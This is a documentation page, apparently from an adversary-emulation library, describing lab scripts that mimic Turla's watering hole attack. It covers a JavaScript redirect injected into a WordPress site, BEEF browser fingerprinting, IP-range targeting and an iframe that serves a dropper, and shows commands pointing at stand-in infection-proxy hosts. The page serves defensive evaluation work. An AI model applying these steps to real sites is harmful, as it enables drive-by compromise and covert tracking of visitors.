@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Watering Hole</title>
+    <meta name="title" content="Watering Hole">
+    <meta name="description" content="Watering Hole">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/turla/resources/setup/files/watering_hole/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/turla/resources/setup/files/watering_hole/">
+    <meta property="og:title" content="Watering Hole">
+    <meta property="og:description" content="Watering Hole">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/turla/resources/setup/files/watering_hole/">
+    <meta property="twitter:title" content="Watering Hole">
+    <meta property="twitter:description" content="Watering Hole">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../../../resources/js/prism.js?v=3.5.0.771964962339" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../enterprise/turla/" class="pr-4">
+                                                Turla
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Resources
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../enterprise/turla/resources/setup/" class="pr-4">
+                                                Turla Setup Procedure
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Files
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../enterprise/turla/resources/setup/files/watering_hole/" class="pr-4">
+                                                Watering Hole
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="watering-hole" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#watering-hole">#</doc-anchor-trigger>
+        <span>Watering Hole</span>
+    </h1>
+</doc-anchor-target>
+<ul>
+<li><doc-anchor-trigger to="#watering-hole">Watering Hole</doc-anchor-trigger>
+<ul>
+<li><doc-anchor-trigger to="#overview">Overview</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#expected-usage">Expected Usage</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#package--os-requirements">Package / OS Requirements</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#preflight-checks">Preflight Checks</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#usage-examples">Usage Examples</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools">Fingerprinting Details from BEEF (via Evercookie and other bundled tools)</doc-anchor-trigger>
+<ul>
+<li><doc-anchor-trigger to="#browser-specific-details">Browser-specific Details</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#browser-specific-capabilities">Browser-specific Capabilities</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#hardware-details">Hardware Details</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#location-information">Location Information</doc-anchor-trigger></li>
+</ul>
+</li>
+<li><doc-anchor-trigger to="#cleanup-instructions">Cleanup Instructions</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#credential-details">Credential Details</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#references">References</doc-anchor-trigger>
+<ul>
+<li><doc-anchor-trigger to="#cti-evidence">CTI Evidence</doc-anchor-trigger></li>
+<li><doc-anchor-trigger to="#wordpress-and-apache">Wordpress and Apache</doc-anchor-trigger></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="overview">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#overview">#</doc-anchor-trigger>
+        <span>Overview</span>
+    </h2>
+</doc-anchor-target>
+<p>The watering hole setup scripts are made to streamline the already streamlined process of spinning up a wordpress server and then altering it to mimic either a &quot;compromised&quot; site or a malicious site. It has the following components:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Component</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Setup</td>
+<td>shell script to install and initialize a generic wordpress site</td>
+</tr>
+<tr>
+<td>Redirection</td>
+<td>python script to append a js redirection script to an html/php file</td>
+</tr>
+<tr>
+<td>Fingerprinting</td>
+<td>python script to install and explain setup of fingerprinting capabilities, including the in-range and out-of-range script files</td>
+</tr>
+<tr>
+<td>IP Range</td>
+<td>python script to prepend a php comparison to an html/php file</td>
+</tr>
+<tr>
+<td>Flash Prep</td>
+<td>python script to install iframe prompt for target and handler code within WordPress that toggles visibility based on cookie presence</td>
+</tr>
+<tr>
+<td>&quot;counter&quot;</td>
+<td>surreptitiously named redirection js file - <strong>REQUIRES CONFIG</strong></td>
+</tr>
+<tr>
+<td>in-range.html</td>
+<td>script tag in html file that will load hook.js, applied to IP addresses designated by IP Range python script</td>
+</tr>
+<tr>
+<td>Cleanup</td>
+<td>cleanup shell script; deletes all site data &amp; database info; kills any processes anticipated to be running</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="expected-usage">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#expected-usage">#</doc-anchor-trigger>
+        <span>Expected Usage</span>
+    </h2>
+</doc-anchor-target>
+<p>On the Kali C2 server (where the victim will be redirected to):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo bash wordpress_setup.sh
+# edit counter.js
+cp counter.js /srv/www/wordpress/counter.js #edited to redirect to where you want
+python3 fingerprinting.py
+# edit beef-master/config.yaml - change username, password, and name of cookie hook
+python3 beef_setup.py
+# edit in-range.html with the location of your BEEF hook.js file
+python3 ip_range.py /srv/www/wordpress/index.php {1 or more IP addresses with or without masks} -i in-range.html -o out-of-range.html
+cd beef-master; ./beef&amp; # this will put beef on in the background
+# {dropper file} is the file that you want the user to download on click
+python3 flash_prep.py /srv/www/wordpress/index.php {dropper file}</code></pre>
+</doc-codeblock></div>
+<p>On the external benign web server (where the victim will browse to, but will be infected with a watering hole):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo bash wordpress_setup.sh
+python3 redirection.py /srv/www/wordpress/index.php http://infectionproxy/counter.js # {Infection Proxy URL including http:// + path to counter.js}</code></pre>
+</doc-codeblock></div>
+<p>The setup and cleanup scripts are what they say on the tin: they will setup or teardown a wordpress site with default and wildly insecure credentials. This is all they do, to allow a user to further set up a watering hole attack as they see fit.</p>
+<p><strong>The prep and cleanup scripts are expected to be run at superuser privileges;</strong> these scripts create and drop databases in SQL, create public directories, and restart system services. Wordpress does not like being run at superuser privileges, so <code v-pre>sudo</code> is frequently used to <em>deescalate</em> to user-level commands during the wordpress install proper.</p>
+<p>The redirection script is intended to mimic the result of a site compromised by an injection attack - it appends a JS redirection script that points to a remote file (presumably counter.js) to be the src of a <code v-pre>script</code> tag. In conjunction, counter.js is expected to be placed on an infection proxy. When executing, write the redirection script to point to counter on the infection proxy host. <strong>You must also edit counter.js when placing it on the infection proxy to redirect the user to where you will be checking their IP addresses - presumed to be the infection proxy host itself.</strong></p>
+<p>The fingerprinting script installs the BEEF framework, reviews necessary config changes, and prepares user to run beef on local machine in anticipation of victim visit.</p>
+<p>The beef setup script confirms that the user has changed BEEF&#x27;s default credentials and reminds them to alter the appropriate IP information in their IP range script.</p>
+<p>The ip range script creates a string of php code and places it in a php file on a separate wordpress site - the one that the client will be redirected to. It will determine if the client is in the range of IP addresses that are of further interest.</p>
+<p>The flash prep script copies a string of iframe HTML to a file of your choosing, presumably the index page of your malicious website, and copies a dropper file to the root of your web server that will be downloaded when a user clicks the link inside the iframe.</p>
+<p>Both shell scripts are run without argument.</p>
+<p><code v-pre>ip_range.py</code>, <code v-pre>redirection.py</code> and <code v-pre>flash_prep.py</code> scripts expect arguments. All python scripts accept the --help flag.</p>
+<doc-anchor-target id="package--os-requirements">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#package--os-requirements">#</doc-anchor-trigger>
+        <span>Package / OS Requirements</span>
+    </h2>
+</doc-anchor-target>
+<p>These scripts were developed on, and are expected to be run on, a Kali Linux box, which is a Debian-based distribution. Service/system calls and package manager examples may differ between distributions.</p>
+<p>These scripts expect default Kali installations of Apache web server and SQL(MariaDB). If you don&#x27;t have them or they&#x27;ve been pruned from your Kali install, get them back with</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">apt install apache2
+apt install default-mysql-server</code></pre>
+</doc-codeblock></div>
+<p>An apache config file for the wordpress site should be included in the directory. Regardless, links below will be provided if one needs to be made from scratch.</p>
+<p>Conversely, the wordpress install should create a wordpress config file for you, but this command expects a running SQL service.</p>
+<p>If you are on a system <em>without</em> SQL, instead uncomment the portion of the script that copies the config file to the wordpress directory, and comment out the SQL and wp config portions of the script. These places are commented appropriately.</p>
+<p>If you are on a system with a SQL installation similar to Kali, the script will handle the creation of this config file for you.</p>
+<doc-anchor-target id="preflight-checks">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#preflight-checks">#</doc-anchor-trigger>
+        <span>Preflight Checks</span>
+    </h2>
+</doc-anchor-target>
+<p>Preflight for a setup script? Yes, just please make sure that you&#x27;ve got everything operational. Get on to the box that you&#x27;re installing things on:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ssh &lt;user&gt;@&lt;IP of server&gt;</code></pre>
+</doc-codeblock></div>
+<p>Make sure that you&#x27;ve got apache and mysql running.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">service apache2 restart
+service mysql restart</code></pre>
+</doc-codeblock></div>
+<p>Make sure that you&#x27;ve got sudo privileges</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo whoami</code></pre>
+</doc-codeblock></div>
+<p>Once you&#x27;ve installed beef via <code v-pre>fingerprinting.py</code>, check that you&#x27;ve changed the default credentials</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">python3 beef_setup.py # this preflight script does not update in-range.html and will remind you to do so</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="usage-examples">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#usage-examples">#</doc-anchor-trigger>
+        <span>Usage Examples</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo bash wordpress_setup.sh
+
+# On &quot;compromised&quot; Wordpress installation
+python3 redirection.py /srv/www/wordpress/index.php https://malicious.url.com/counter.js
+
+# On malicious Wordpress installation
+vim counter.js # don't forget to edit counter.js to the URL you'd like the victim to be redirected to!
+
+cp counter.js /srv/www/wordpress/counter.js
+
+python3 fingerprinting.py
+
+python3 beef_setup.py
+
+python3 ip_range.py --help
+
+python3 ip_range.py /srv/www/wordpress/index.php 10.10.10.0 10.10.10.1 -i in_range.html
+
+python3 ip_range.py /srv/www/wordpress/index.php 10.10.10.0/31 -i in_range.html -o out_of_range.html</code></pre>
+</doc-codeblock></div>
+<p><strong>Note that expected usage is that the redirection and the ip range / fingerprinting scripts are to be run on different servers.</strong></p>
+<doc-anchor-target id="fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools">#</doc-anchor-trigger>
+        <span>Fingerprinting Details from BEEF (via Evercookie and other bundled tools)</span>
+    </h2>
+</doc-anchor-target>
+<p>Not all the information here is available on every machine. Some information will be listed as &quot;Unknown&quot;, some information will simply be blank. This represents the information available to the developer when BEEF &amp; evercookie was tested. This list is provided in case third parties ask about the specificity of detail that the fingerprinting tool provides, as opposed to the information specifically sought by the adversary when identifying the victim.</p>
+<doc-anchor-target id="browser-specific-details">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#browser-specific-details">#</doc-anchor-trigger>
+        <span>Browser-specific Details</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Browser Engine (e.g. Gecko)</li>
+<li>Reported Name (e.g. Mozilla/5.0)</li>
+<li>Platform (e.g. Linux x86_64)</li>
+<li>Plugins (As opposed to &quot;capabilities&quot; below, this includes PDF viewer information)</li>
+<li>Cookies</li>
+<li>Hostname &amp; Port</li>
+<li>Referrer</li>
+<li>Windows Height &amp; Width</li>
+<li>URI</li>
+</ul>
+<doc-anchor-target id="browser-specific-capabilities">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#browser-specific-capabilities">#</doc-anchor-trigger>
+        <span>Browser-specific Capabilities</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>ActiveX</li>
+<li>Flash</li>
+<li>Google Gears</li>
+<li>PhoneGap / Apache Cordova</li>
+<li>QuickTime</li>
+<li>RealPlayer</li>
+<li>Silverlight</li>
+<li>VB Script</li>
+<li>VLC</li>
+<li>WebGL</li>
+<li>WebRTC</li>
+<li>WebSocket</li>
+<li>WMP</li>
+</ul>
+<doc-anchor-target id="hardware-details">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#hardware-details">#</doc-anchor-trigger>
+        <span>Hardware Details</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Battery Level</li>
+<li>Architecture (e.g. x86_64)</li>
+<li>CPU Cores</li>
+<li>GPU Details / Driver (e.g. using llvm_pipe instead of dedicated GPU)</li>
+<li>Memory</li>
+<li>Screen Color Depth</li>
+<li>Screen Height &amp; Width</li>
+<li>Is the screen touch-enabled?</li>
+<li>OS Architecture</li>
+<li>OS Family &amp; Name</li>
+<li>OS Version</li>
+</ul>
+<doc-anchor-target id="location-information">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#location-information">#</doc-anchor-trigger>
+        <span>Location Information</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>City</li>
+<li>Country</li>
+<li>IP Address</li>
+</ul>
+<doc-anchor-target id="cleanup-instructions">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup-instructions">#</doc-anchor-trigger>
+        <span>Cleanup Instructions</span>
+    </h2>
+</doc-anchor-target>
+<p>Cleanup script will drop wordpress database and user, delete wordpress files, and deactivate the wordpress apache config file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo bash wordpress_cleanup.sh</code></pre>
+</doc-codeblock></div>
+<p>If for any reason you need to separately stop, pause, or restart the BEEF process but you cannot remember the PID, list all ruby processes then investigate each one:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pgrep ruby # lists all processes run using ruby, which includes BEEF
+ps -o cmd fp [PID] # identifies the command that spawned the PID</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="credential-details">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#credential-details">#</doc-anchor-trigger>
+        <span>Credential Details</span>
+    </h2>
+</doc-anchor-target>
+<p>For the SQL (MariaDB) installation, the script creates (and the config file expects) the following default credentials:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">username: wordpressuser
+password: password</code></pre>
+</doc-codeblock></div>
+<p>For the wordpress administration, the script creates (and wordpress expects) the following default credentials:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">username: wpcli
+password: wpcli</code></pre>
+</doc-codeblock></div>
+<p>For the beef installation, the installation has the following default credentials that must be changed in */beef-master/config.yaml</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">username: beef
+password: beef</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="references">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#references">#</doc-anchor-trigger>
+        <span>References</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="cti-evidence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cti-evidence">#</doc-anchor-trigger>
+        <span>CTI Evidence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/">https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/</a></li>
+<li><a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf">https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf</a></li>
+<li><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf">https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf</a></li>
+</ul>
+<doc-anchor-target id="wordpress-and-apache">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#wordpress-and-apache">#</doc-anchor-trigger>
+        <span>Wordpress and Apache</span>
+    </h3>
+</doc-anchor-target>
+<ul>
